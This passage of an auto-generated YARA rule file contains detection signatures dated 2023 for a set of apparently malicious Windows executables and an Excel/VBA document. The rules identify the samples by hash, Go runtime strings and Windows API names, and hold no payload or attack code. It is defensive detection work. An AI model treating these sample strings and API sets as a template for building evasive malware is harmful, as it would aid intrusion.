      $s19 = "reflect.Value.setRunes" fullword ascii /* score: '10.00'*/
      $s20 = "reflect.(*rtype).Key" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_14 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash7 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash8 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s2 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s3 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.sweepone.func1" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.(*mSpanStateBox).get" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.headTailIndex.split" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.offAddr.sub" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.pallocSum.max" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.typehash" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.memhashFallback" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.pallocSum.end" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.chanparkcommit" fullword ascii /* score: '13.00'*/
      $s16 = "runtime.memhash64Fallback" fullword ascii /* score: '13.00'*/
      $s17 = "runtime.offAddr.add" fullword ascii /* score: '13.00'*/
      $s18 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s19 = "runtime.strhashFallback" fullword ascii /* score: '13.00'*/
      $s20 = "runtime.memhash32Fallback" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966_89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3_15 {
   meta:
      description = "dataset - from files 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash2 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
   strings:
      $x1 = " > (den<<shift)/2unreserving unaligned region45474735088646411895751953125C:\\Windows\\System32\\ntdll.dllCentral America Standa" ascii /* score: '73.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '64.50'*/
      $x3 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '63.00'*/
      $x4 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x5 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x6 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x7 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x8 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing" ascii /* score: '47.00'*/
      $x9 = "EnumKeyExWRegEnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWb" ascii /* score: '41.00'*/
      $x10 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '41.00'*/
      $x11 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x12 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner: SplitFunc returns negative advance countcasfrom_Gscans" ascii /* score: '34.00'*/
      $x13 = " P runtime: p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] a" ascii /* score: '31.00'*/
      $s14 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '30.00'*/
      $s15 = " untyped locals , not a function0123456789ABCDEF0123456789abcdef2384185791015625CreateDirectoryWCreateJobObjectWCryptProtectData" ascii /* score: '30.00'*/
      $s16 = "-struct typeruntime: VirtualQuery failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime:" ascii /* score: '30.00'*/
      $s17 = "23283064365386962890625<invalid reflect.Value>Argentina Standard TimeAstrakhan Standard TimeCertGetCertificateChainDeleteVolumeM" ascii /* score: '29.00'*/
      $s18 = "longforEachP: not donegarbage collectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child process" ascii /* score: '28.00'*/
      $s19 = "2+ optional header: %vfailure to read optional header magic: %vgcSweep being done but phase is not GCoffmheap.freeSpanLocked - i" ascii /* score: '28.00'*/
      $s20 = "wirep: already in goworkbuf is not emptywrite of Go pointer ws2_32.dll not foundzlib: invalid header of unexported method previo" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f_e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920_16 {
   meta:
      description = "dataset - from files 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f, e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      hash2 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
   strings:
      $s1 = " /p \"%1\"" fullword ascii /* score: '9.00'*/
      $s2 = " /pt \"%1\" \"%2\" \"%3\" \"%4\"" fullword ascii /* score: '5.00'*/
      $s3 = "Regserver" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.89'*/ /* Goodware String - occured 111 times */
      $s4 = "command" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.48'*/ /* Goodware String - occured 524 times */
      $s5 = "D$`+D$XF" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "}\"@8:u" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "D$xD+D$`D" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "D$XD+\\$d+D$`A" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "+D$PA+" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s10 = "f9A2sr" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s11 = "L$,D+D$$+" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s12 = "T$,;T$\\~4" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "|%H;L$X}" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "L$8H!t$0L" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s15 = "D$TD+\\$H+D$L" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s16 = "t)H9{@u#" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s17 = "D!|$0I" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s18 = "taH9~@u[H" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s19 = "+!t$pL" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s20 = "+L$PD;" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9_7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc_17 {
   meta:
      description = "dataset - from files 7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
      hash2 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash3 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash4 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash5 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash6 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "wprocessorrevision" fullword ascii /* score: '19.00'*/
      $s2 = "wprocessorlevel" fullword ascii /* score: '19.00'*/
      $s3 = "dwnumberofprocessors" fullword ascii /* score: '19.00'*/
      $s4 = "dwprocessortype" fullword ascii /* score: '19.00'*/
      $s5 = "dwactiveprocessormask" fullword ascii /* score: '19.00'*/
      $s6 = "**struct { F uintptr; rw *runtime.rwmutex }" fullword ascii /* score: '18.00'*/
      $s7 = "*runtime.rwmutex" fullword ascii /* score: '18.00'*/
      $s8 = "targetpc" fullword ascii /* score: '18.00'*/
      $s9 = "syscall.CloseOnExec" fullword ascii /* score: '15.00'*/
      $s10 = "sweepdone" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.(*mspan).sweep" fullword ascii /* score: '12.00'*/
      $s12 = "*runtime.systeminfo" fullword ascii /* score: '11.00'*/
      $s13 = "runlock" fullword ascii /* score: '11.00'*/
      $s14 = "runtime.ctrlhandler" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.readgogc" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.name.tagLen" fullword ascii /* score: '10.00'*/
      $s17 = "readerPass" fullword ascii /* score: '10.00'*/
      $s18 = "runtime.freespecial" fullword ascii /* score: '10.00'*/
      $s19 = " *map.hdr[uint32][]*runtime._type" fullword ascii /* score: '10.00'*/
      $s20 = "runtime.onosstack" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966_89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3_18 {
   meta:
      description = "dataset - from files 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash2 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash3 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash4 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "allocSpan" fullword ascii /* base64 encoded string 'jYhq*Z' */ /* score: '14.00'*/
      $s2 = "*struct { F uintptr; addrRangeToSummaryRange func(int, runtime.addrRange) (int, int); summaryRangeToSumAddrRange func(int, int, " ascii /* score: '12.00'*/
      $s3 = "*struct { F uintptr; addrRangeToSummaryRange func(int, runtime.addrRange) (int, int); summaryRangeToSumAddrRange func(int, int, " ascii /* score: '12.00'*/
      $s4 = "*runtime.headTailIndex" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.gFromTLS" fullword ascii /* score: '10.00'*/
      $s6 = "8pipeu$H" fullword ascii /* score: '10.00'*/
      $s7 = "decHead" fullword ascii /* score: '9.00'*/
      $s8 = "nextSpanForSweep" fullword ascii /* score: '9.00'*/
      $s9 = "incHead" fullword ascii /* score: '9.00'*/
      $s10 = "summaryRangeToSumAddrRange" fullword ascii /* score: '9.00'*/
      $s11 = "addrRangeToSummaryRange" fullword ascii /* score: '9.00'*/
      $s12 = "*runtime.spanSet" fullword ascii /* score: '7.00'*/
      $s13 = "*runtime.chunkIdx" fullword ascii /* score: '7.00'*/
      $s14 = " *[8192]*[8192]runtime.pallocData" fullword ascii /* score: '7.00'*/
      $s15 = "time.offAddr }" fullword ascii /* score: '7.00'*/
      $s16 = "encoding/binary.littleEndian.PutUint64" fullword ascii /* score: '7.00'*/
      $s17 = "*[]runtime.pallocSum" fullword ascii /* score: '7.00'*/
      $s18 = "*[][]runtime.pallocSum" fullword ascii /* score: '7.00'*/
      $s19 = "int) runtime.addrRange }" fullword ascii /* score: '7.00'*/
      $s20 = "*[5][]runtime.pallocSum" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89_9d35e17421e9a1c8458f32cd813bd27f_19 {
   meta:
      description = "dataset - from files 1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89, 9d35e17421e9a1c8458f32cd813bd27f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89"
      hash2 = "910e449d025890cc10c331f41de133f6865bb8fbe66facafec461b121e9aef1d"
   strings:
      $s1 = "#C:\\Wind" fullword ascii /* score: '7.00'*/
      $s2 = "Bustomi" fullword ascii /* score: '6.00'*/
      $s3 = "Workbookk" fullword ascii /* score: '6.00'*/
      $s4 = "Worksheet" fullword ascii /* score: '6.00'*/
      $s5 = "_(* #,##0.00_);_(* \\(#,##0.00\\);_(* \"-\"??_);_(@_)" fullword ascii /* score: '5.00'*/
      $s6 = "_(\"$\"* #,##0_);_(\"$\"* \\(#,##0\\);_(\"$\"* \"-\"_);_(@_)" fullword ascii /* score: '5.00'*/
      $s7 = "Project1" fullword ascii /* score: '5.00'*/
      $s8 = "_(\"$\"* #,##0.00_);_(\"$\"* \\(#,##0.00\\);_(\"$\"* \"-\"??_);_(@_)" fullword ascii /* score: '5.00'*/
      $s9 = "_(* #,##0_);_(* \\(#,##0\\);_(* \"-\"_);_(@_)" fullword ascii /* score: '5.00'*/
      $s10 = "_VBA_PROJECT" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 30 times */
      $s11 = "PROJECTwm" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 30 times */
      $s12 = "CreateObject" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.81'*/ /* Goodware String - occured 189 times */
      $s13 = "60% - Accent2" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "Linked Cell" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "Document=Sheet1/&H00000000" fullword ascii /* score: '4.00'*/
      $s16 = "Check Cell" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "40% - Accent3" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "20% - Accent3" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "Accent1" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "sWorkboo" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076_2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76_20 {
   meta:
      description = "dataset - from files e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9, 1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      hash2 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      hash3 = "1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
   strings:
      $s1 = "C:\\Program Files (x86)\\Microsoft Visual Studio 9.0\\VC\\atlmfc\\include\\afxwin1.inl" fullword ascii /* score: '13.00'*/
      $s2 = "L9gp~#I" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s3 = "mfcm90.dll" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = "L9g ~nI" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s5 = "D8I8t/L9I" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s6 = "D8d$HtGH" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s7 = "tLL9ipI" fullword ascii /* score: '1.00'*/
      $s8 = " A_A]A\\_^" fullword ascii /* score: '1.00'*/
      $s9 = "H9\\$H~jI" fullword ascii /* score: '1.00'*/
      $s10 = "t)D8I8t0L9I" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s11 = "8Q8t.H9Q" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s12 = "H9_ ~DH" fullword ascii /* score: '1.00'*/
      $s13 = "D$@H9D" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s14 = "t)D8I8t+L9I" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s15 = "t)D8I8t5L9I" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s16 = "I94$up" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_21 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
   strings:
      $x1 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '73.00'*/
      $x2 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x3 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '48.00'*/
      $x4 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCertGetNameStringWCloseServiceHandleCo" ascii /* score: '42.00'*/
      $x5 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '41.00'*/
      $s6 = " untyped locals , not a function0123456789ABCDEF0123456789abcdef2384185791015625CreateDirectoryWCreateJobObjectWCryptProtectData" ascii /* score: '30.00'*/
      $s7 = "kexec format errorg already scannedglobalAlloc.mutexinvalid bit size locked m0 woke upmark - bad statusmarkBits overflownil reso" ascii /* score: '30.00'*/
      $s8 = "23283064365386962890625<invalid reflect.Value>Argentina Standard TimeAstrakhan Standard TimeCertGetCertificateChainDeleteVolumeM" ascii /* score: '29.00'*/
      $s9 = "ectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canc" ascii /* score: '29.00'*/
      $s10 = "5C:\\Windows\\System32\\kernel32.dllCertAddCertificateContextToStoreCertVerifyCertificateChainPolicyGetVolumePathNamesForVolumeN" ascii /* score: '28.00'*/
      $s11 = "h of trace eventio: read/write on closed pipemachine is not on the networkno XENIX semaphores availablenotesleep - waitm out of " ascii /* score: '24.00'*/
      $s12 = "workbuf is not emptywrite of Go pointer ws2_32.dll not foundzlib: invalid header of unexported method previous allocCount=, leve" ascii /* score: '24.00'*/
      $s13 = "reeSpaceExWGetOverlappedResultGetSystemDirectoryWGetTokenInformationHaiti Standard TimeIDS_Binary_OperatorIndia Standard TimeKhi" ascii /* score: '23.00'*/
      $s14 = "GetUserProfileDirectoryWGetWindowThreadProcessIdMagallanes Standard TimeMontevideo Standard TimeNorth Asia Standard TimePacific " ascii /* score: '23.00'*/
      $s15 = "urrentThreadIdGetExitCodeProcessGetFileAttributesWGetModuleFileNameWGetModuleHandleExWGetSidSubAuthorityGetVolumePathNameWIran S" ascii /* score: '23.00'*/
      $s16 = "GetPriorityClassImperial_AramaicMeroitic_CursiveNetApiBufferFreeOpenProcessTokenOther_AlphabeticRCodeFormatErrorRegQueryInfoKeyW" ascii /* score: '22.00'*/
      $s17 = "esStatusExWGetNamedSecurityInfoWGetProfilesDirectoryWGetVolumeInformationWInscriptional_PahlaviLookupPrivilegeValueWMagadan Stan" ascii /* score: '21.00'*/
      $s18 = "iginalChina Standard TimeCreateSymbolicLinkWCryptReleaseContextEgypt Standard TimeGC work not flushedGetCurrentProcessIdGetDiskF" ascii /* score: '20.00'*/
      $s19 = "temPreferredUILanguagesGetThreadPreferredUILanguagesGetVolumeInformationByHandleWN. Central Asia Standard TimeNorth Asia East St" ascii /* score: '19.00'*/
      $s20 = "teger divide by zerointerface conversion: kernel32.dll not foundminpc or maxpc invalidnetwork is unreachablenon-Go function at p" ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_22 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash7 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
   strings:
      $s1 = "l=s.allocCount= semaRoot queuestack overflowstopm spinningstore64 failedsync.Cond.Waittext file busytoo many linkstoo many users" ascii /* score: '18.00'*/
      $s2 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s3 = "*runtime.errorAddressString" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.(*errorAddressString).Error" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.pMask.set" fullword ascii /* score: '13.00'*/
      $s6 = "*runtime.pcHeader" fullword ascii /* score: '12.00'*/
      $s7 = "runtime.getMCache" fullword ascii /* score: '11.00'*/
      $s8 = "runtime.mdestroy" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.createHighResTimer" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.pMask.read" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.spanAllocType.manual" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.mPark" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.funcpkgpath" fullword ascii /* score: '10.00'*/
      $s14 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '10.00'*/
      $s15 = "runtime.allocm.func1" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.offAddr.addr" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.endCheckmarks" fullword ascii /* score: '10.00'*/
      $s18 = "runtime.printuintptr" fullword ascii /* score: '10.00'*/
      $s19 = "runtime.updateTimerPMask" fullword ascii /* score: '10.00'*/
      $s20 = "runtime.initHighResTimer" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9_2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7d_23 {
   meta:
      description = "dataset - from files 5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9, 2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
